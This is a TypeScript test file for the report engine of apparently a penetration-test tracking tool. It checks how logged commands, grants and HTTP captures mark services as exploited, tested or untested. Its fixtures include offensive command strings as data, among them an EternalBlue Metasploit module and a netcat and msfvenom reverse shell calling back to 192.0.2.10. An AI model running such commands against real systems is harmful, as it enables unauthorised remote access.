import { describe, expect, it } from "vitest";
import { isPortScan, msfModules, requestPort, serviceCoverage, testedLine, testedNotExploited } from "../engines/report";
import type { ReportData } from "../engines/report";
import type { Host } from "../types/host";
import type { LogEntry } from "../types/log";

const H = "h1";
const svc = (port: number, extra = {}) => ({ id: `s${port}`, hostId: H, port, protocol: "tcp", nmapService: "http", nmapVersion: null, confirmedProduct: null, confirmedVersion: null, verdict: null, ...extra });
const attempt = (title: string, extra = {}) => ({ id: title, hostId: H, title, reasonKind: "control", private: false, ...extra });

function data(): ReportData {
  return {
    engagement: { id: "e1", domain: null },
    hosts: [{ id: H, name: "web01", ip: "10.0.0.5", access: "root" }, { id: "h2", name: "dc01", ip: null, access: "none" }],
    services: [
      svc(80, { confirmedProduct: "Apache", confirmedVersion: "2.4" }),
      svc(22),
      svc(445),
      svc(3389),
    ],
    findings: [{ id: "f1", title: "RCE in app", hostIds: [H], serviceIds: ["s80"] }],
    attempts: [
      attempt("SSH brute force on 22", { reason: "WAF drops it" }),
      attempt("scan 10.0.22.5 sweep", { reason: "" }),
            attempt("RDP spray 3389", { private: false, reasonKind: "operator" }),
    ],
    ruledOut: [],
    grants: [],
    hops: [],
    log: [],
  } as unknown as ReportData;
}

describe("serviceCoverage", () => {
  it("classifies exploited, tested and untested", () => {
    const rows = serviceCoverage(data(), H, {});
    const by = (p: number) => rows.find((r) => r.port === p)!;
    expect(by(80)).toMatchObject({ result: "exploited", via: "RCE in app", product: "Apache 2.4", proven: true });
    expect(by(22)).toMatchObject({ result: "tested", via: "SSH brute force on 22", proven: false, product: "http" });
    expect(by(445).result).toBe("untested");
    expect(by(3389).result).toBe("untested"); // operator attempt never counts
    expect(by(445).via).toBeNull();
  });
  it("treats a dead-end verdict as tested and lets an override win", () => {
    const d = data();
    d.services[2] = svc(445, { verdict: "dead_end" }) as never;
    const rows = serviceCoverage(d, H, { s22: { result: "untested", note: "note!" } });
    expect(rows.find((r) => r.port === 445)?.result).toBe("tested");
    expect(rows.find((r) => r.port === 22)).toMatchObject({ result: "untested", via: "note!" });
  });
});

describe("serviceCoverage from real work", () => {
  const cmd = (id: string, command: string, extra = {}) =>
    ({ id, kind: "command", title: id, hostIds: [H], private: false, content: { kind: "command", blocks: [{ command, output: "x" }] }, ...extra }) as unknown as LogEntry;
  const http = (id: string, request: string) =>
    ({ id, kind: "http", title: id, hostIds: [H], private: false, content: { kind: "http", request, response: null } }) as unknown as LogEntry;
  const at = (d: ReportData, port: number) => serviceCoverage(d, H, {}).find((r) => r.port === port)!;
  const base = () => {
    const d = data();
    d.attempts = [];
    d.services = [...d.services, svc(8080), svc(8443), svc(5985, { nmapService: "wsman" })] as never;
    return d;
  };

  it("counts credential attempts on the service", () => {
    const d = base();
    d.credAttempts = [{ id: "a", credId: "c", hostId: H, service: "smb", port: null, result: "failed" }] as never;
    expect(at(d, 445)).toMatchObject({ result: "tested", via: "credentials tried on SMB" });
    expect(at(d, 3389).result).toBe("untested");
  });

  it("counts commands against the host's port, never a port scan", () => {
    const d = base();
    d.log = [
      cmd("gobuster", "gobuster dir -u http://10.0.0.5:8080/ -w common.txt"),
      cmd("winrm", "evil-winrm -i 10.0.0.5 -u bob -p pw"),
      cmd("nmap", "nmap -p 3389 10.0.0.5"),
      cmd("private", "xfreerdp /v:10.0.0.5", { private: true }),
    ];
    expect(at(d, 8080)).toMatchObject({ result: "tested", via: "gobuster" });
    expect(at(d, 5985)).toMatchObject({ result: "tested", via: "winrm" });
    expect(at(d, 3389).result).toBe("untested");
  });

  it("matches the host by its name in the engagement's domain", () => {
    const d = base();
    d.engagement = { id: "e1", domain: "exam.corp" } as never;
    d.log = [cmd("curl", "curl -sk https://web01.exam.corp:8443/admin")];
    expect(at(d, 8443)).toMatchObject({ result: "tested", via: "curl" });
    expect(at(d, 3389).result).toBe("untested");
  });

  it("counts captured HTTP requests by their Host header or URL port", () => {
    const d = base();
    d.log = [http("login", "POST /login HTTP/1.1\nHost: 10.0.0.5:8080\n\nu=a"), http("tls", "GET https://10.0.0.5/ HTTP/1.1")];
    expect(at(d, 8080)).toMatchObject({ result: "tested", via: "login" });
    expect(at(d, 8443).result).toBe("untested");
    expect(requestPort("GET https://10.0.0.5/ HTTP/1.1")).toBe(443);
    expect(requestPort("GET / HTTP/1.1\nHost: web01")).toBe(80);
    expect(requestPort("GET / HTTP/1.1\nHost: web01:443")).toBe(443);
    expect(requestPort("GET / HTTP/2\nHost: web01")).toBe(443);
    expect(requestPort("GET http://web01:8080/x HTTP/1.1")).toBe(8080);
    // An absolute request line's port wins over a portless Host header (a proxy capture); a Host port still wins.
    expect(requestPort("GET http://web01:8080/x HTTP/1.1\nHost: web01")).toBe(8080);
    expect(requestPort("GET http://web01:8080/x HTTP/1.1\nHost: web01:9090")).toBe(9090);
    // A portless request goes to the host's only web service when it has one.
    expect(requestPort("GET / HTTP/1.1\nHost: web01", 8080)).toBe(8080);
  });

  it("counts a portless request against the host's only web service, an HTTPS one against 443", () => {
    const d = base();
    d.services = [svc(22, { nmapService: "ssh" }), svc(8080, { nmapService: "http-proxy" })] as never;
    d.log = [http("q", "GET /admin HTTP/1.1\nHost: 10.0.0.5")];
    expect(at(d, 8080)).toMatchObject({ result: "tested", via: "q" });
    d.services = [svc(8080, { nmapService: "http-proxy" }), svc(443, { nmapService: "ssl/http" })] as never;
    expect(at(d, 8080).result).toBe("untested");
    d.log = [http("tls", "GET / HTTP/2\nHost: 10.0.0.5")];
    expect(at(d, 443)).toMatchObject({ result: "tested", via: "tls" });
  });
});

describe("testedNotExploited", () => {
  it("excludes private attempts and words the reason", () => {
    const d = data();
    d.ruledOut = [{ id: "r", hostId: H, text: "FTP anon", reason: "disabled", private: false }] as never;
    expect(testedNotExploited(d, H)).toEqual([
      { title: "SSH brute force on 22", reason: "blocked by a control: WAF drops it", port: null },
      { title: "scan 10.0.22.5 sweep", reason: "blocked by a control", port: null },
      { title: "FTP anon", reason: "disabled", port: null },
    ]);
    expect(testedNotExploited(d, null)).toEqual([]);
  });

  it("knows the port from the attempt's finding or the dead-end service", () => {
    const d = data();
    d.attempts = [attempt("Apache path traversal", { reason: "patched", findingId: "f1" })] as never;
    d.ruledOut = [{ id: "r", hostId: H, text: "SMB", reason: "signing required", private: false, sourceKind: "service", sourceId: "s445" }] as never;
    expect(testedNotExploited(d, H).map((r) => r.port)).toEqual([80, 445]);
  });
});

describe("testedLine", () => {
  it("reads <what> on <port>: <reason>, the port only when the title doesn't name it", () => {
    expect(testedLine({ title: "Apache path traversal", reason: "precondition not met: patched", port: 80 })).toBe(
      "Apache path traversal on 80: precondition not met: patched",
    );
    expect(testedLine({ title: "SSH brute force on 22", reason: "no access", port: 22 })).toBe("SSH brute force on 22: no access");
    expect(testedLine({ title: "FTP anonymous login", reason: "", port: null })).toBe("FTP anonymous login");
  });
});

const entry = (id: string, command: string, extra: Partial<LogEntry> = {}) =>
  ({ id, kind: "command", hostIds: [H], private: false, content: { kind: "command", blocks: [{ command, output: "" }] }, ...extra }) as LogEntry;

describe("isPortScan", () => {
  it("finds a port scanner in any block, behind sudo or after a separator", () => {
    expect(isPortScan(entry("a", "nmap -sV 10.0.0.5"))).toBe(true);
    expect(isPortScan(entry("b", "sudo rustscan -a 10.0.0.5"))).toBe(true);
    expect(isPortScan(entry("c", "cd /tmp && masscan -p1-65535 10.0.0.5"))).toBe(true);
    expect(isPortScan(entry("d", "smbclient -L //10.0.0.5"))).toBe(false);
    expect(isPortScan({ ...entry("e", ""), content: { kind: "note", text: "nmap" } } as LogEntry)).toBe(false);
  });
});

describe("msfModules", () => {
  it("lists modules and ignores multi/handler", () => {
    const hosts = [{ id: H, name: "web01", ip: "10.0.0.5" }] as Host[];
    const log = [
      entry("m", "msfconsole -q\nuse exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 10.0.0.5"),
      entry("n", "use exploit/multi/handler"),
    ];
    expect(msfModules(log, { id: "e1", domain: null } as never, hosts)).toEqual([
      { hostId: H, module: "exploit/windows/smb/ms17_010_eternalblue" },
    ]);
  });
});

describe("serviceCoverage from access", () => {
  const cmdEntry = (id: string, command: string, extra: Partial<LogEntry> = {}) =>
    ({ id, kind: "command", hostIds: [H], private: false, title: "step", content: { kind: "command", blocks: [{ command, output: "x" }] }, ...extra }) as LogEntry;
  const base = () => {
    const d = data();
    d.findings = [];
    d.attempts = [];
    d.services = [
      svc(22, { nmapService: "ssh" }),
      svc(445, { nmapService: "microsoft-ds" }),
      svc(5985, { nmapService: "http" }),
      svc(8080, { nmapService: "http" }),
    ] as never;
    return d;
  };
  const by = (d: ReportData, p: number) => serviceCoverage(d, H, {}).find((r) => r.port === p)!;

  it("reads a grant's linked entry: evil-winrm is 5985, ssh is 22", () => {
    const d = base();
    d.log = [cmdEntry("l1", "evil-winrm -i 10.0.0.5 -u j -p x"), cmdEntry("l2", "chmod 600 k && ssh -i k dev@10.0.0.5")];
    d.grants = [
      { hostId: H, level: "user", via: "Provided credentials", logEntryId: "l1", at: 1 },
      { hostId: H, level: "user", via: "Key login", logEntryId: "l2", at: 2 },
    ] as never;
    expect(by(d, 5985)).toMatchObject({ result: "exploited", via: "Provided credentials" });
    expect(by(d, 22)).toMatchObject({ result: "exploited", via: "Key login" });
    expect(by(d, 445).result).toBe("untested");
    // The same grant's entry names no web port: 8080 stays untested.
    expect(by(d, 8080).result).toBe("untested");
  });

  it("reads a hop's via (psexec is 445) and a port named outright", () => {
    const d = base();
    d.hops = [
      { fromHostId: "h2", toHostId: H, via: "Pass the hash (psexec)", logEntryId: null, at: 1 },
      { fromHostId: "h2", toHostId: H, via: "Tomcat manager on 8080", logEntryId: null, at: 2 },
    ] as never;
    expect(by(d, 445)).toMatchObject({ result: "exploited", via: "Pass the hash (psexec)" });
    expect(by(d, 8080)).toMatchObject({ result: "exploited", via: "Tomcat manager on 8080" });
  });

  it("never reads a listener or callback port in a linked command as the target's", () => {
    const d = base();
    d.services = [...d.services, svc(443, { nmapService: "https" }), svc(80, { nmapService: "http" })] as never;
    d.log = [
      cmdEntry("l1", "rlwrap nc -lvnp 443"),
      cmdEntry("l2", 'nc.exe 192.0.2.10 80 -e cmd.exe\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=192.0.2.10 LPORT=443 -f exe'),
      cmdEntry("l3", "evil-winrm -i 10.0.0.5 -u j -p x"),
    ];
    d.grants = [
      { hostId: H, level: "user", via: "Reverse shell", logEntryId: "l1", at: 1 },
      { hostId: H, level: "system", via: "Service binary swap", logEntryId: "l2", at: 2 },
      { hostId: H, level: "user", via: "Provided credentials", logEntryId: "l3", at: 3 },
    ] as never;
    expect(by(d, 443).result).toBe("untested");
    expect(by(d, 80).result).toBe("untested");
    expect(by(d, 5985)).toMatchObject({ result: "exploited", via: "Provided credentials" });
  });

  it("reads a port named in the linked entry's title", () => {
    const d = base();
    d.log = [cmdEntry("l1", "curl -s http://10.0.0.5:8080/manager", { title: "Tomcat manager upload on 8080" })];
    d.grants = [{ hostId: H, level: "user", via: "WAR upload", logEntryId: "l1", at: 1 }] as never;
    expect(by(d, 8080)).toMatchObject({ result: "exploited", via: "WAR upload" });
  });

  it("reads a port that ends a sentence, but never one inside an IP or a decimal", () => {
    const d = base();
    d.services = [...d.services, svc(3389, { nmapService: "unknown" })] as never;
    d.hops = [
      { fromHostId: "h2", toHostId: H, via: "Logged in via ssh on 22.", logEntryId: null, at: 1 },
      { fromHostId: "h2", toHostId: H, via: "Tomcat manager on 8080.", logEntryId: null, at: 2 },
      { fromHostId: "h2", toHostId: H, via: "Pivot from 10.0.445.5 and 5985.5", logEntryId: null, at: 3 },
    ] as never;
    d.attempts = [attempt("Default creds tried on 3389.", { reason: "locked out" }), attempt("Swept 10.0.22.5", { reason: "" })] as never;
    expect(by(d, 22)).toMatchObject({ result: "exploited", via: "Logged in via ssh on 22." });
    expect(by(d, 8080)).toMatchObject({ result: "exploited", via: "Tomcat manager on 8080." });
    expect(by(d, 3389)).toMatchObject({ result: "tested", via: "Default creds tried on 3389." });
    expect(by(d, 445).result).toBe("untested");
    expect(by(d, 5985).result).toBe("untested");
    // "10.0.22.5" never marks 22 as tested.
    d.hops = [];
    expect(by(d, 22).result).toBe("untested");
  });

  it("ignores a private linked entry, other hosts' grants, and lets a finding and an override win", () => {
    const d = base();
    d.log = [cmdEntry("l1", "ssh dev@10.0.0.5", { private: true })];
    d.grants = [
      { hostId: H, level: "user", via: "Shell", logEntryId: "l1", at: 1 },
      { hostId: "h2", level: "user", via: "ssh", logEntryId: null, at: 1 },
    ] as never;
    expect(by(d, 22).result).toBe("untested");
    d.grants = [{ hostId: H, level: "user", via: "ssh login", logEntryId: null, at: 1 }] as never;
    d.findings = [{ id: "f", title: "Weak SSH key", hostIds: [H], serviceIds: ["s22"] }] as never;
    expect(by(d, 22)).toMatchObject({ result: "exploited", via: "Weak SSH key" });
    expect(serviceCoverage(d, H, { s22: { result: "tested" } })[0].result).toBe("tested");
  });
});
